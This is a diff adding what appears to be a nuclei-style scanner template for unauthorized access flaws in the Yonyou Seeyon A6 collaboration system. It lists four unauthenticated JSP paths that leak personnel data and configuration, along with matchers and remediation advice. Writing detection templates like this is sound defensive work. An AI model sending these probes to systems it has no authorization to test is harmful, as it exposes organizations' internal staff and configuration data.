@@ -1,0 +1,37 @@
+id: wooyun-2015-0105502
+info:
+  name: 用友致远A6多处未授权访问
+  author:
+  - 折跃
+  description: |-
+    用友致远A6 多处未授权访问漏洞
+    用友致远A6协同管理系统是一个基于互联网的高效协同工作平台和优秀的协同管理系统。
+
+    用友致远A6存在未授权访问漏洞，该漏洞源于网络系统或产品未正确限制来自未授权角色的资源访问，进而造成信息泄露问题。
+  severity: medium
+  remediation: |-
+    官方修复方案：：
+    1、建议用户到官方获取最新补丁或者最新版本程序：
+    https://www.seeyon.com/
+
+    临时修复方案：
+    1、前后端同时对用户输入信息进行校验，双重验证机制。
+    2、调用功能前验证用户是否有权限调用相关功能。
+    3、去除页面中涉及的敏感信息或删除泄露信息页面
+    4、将敏感信息进行加密存储，非必要不可发送前端
+requests:
+- matchers:
+  - type: dsl
+    condition: and
+    dsl:
+    - status_code==200
+    - contains(body,'insertObject') || contains(body,'new personList') || contains(body,'FTP')
+  path:
+  - '{{BaseURL}}/yyoa/common/SelectPerson/reloadData.jsp'
+  - '{{BaseURL}}//yyoa/assess/js/initDataAssess.jsp'
+  - '{{BaseURL}}/yyoa/ext/trafaxserver/SystemManage/config.jsp'
+  - '{{BaseURL}}/yyoa/common/selectPersonNew/initData.jsp?trueName=1'
+  method: GET
+  headers:
+    Host: '{{Hostname}}'
+  req-condition: true
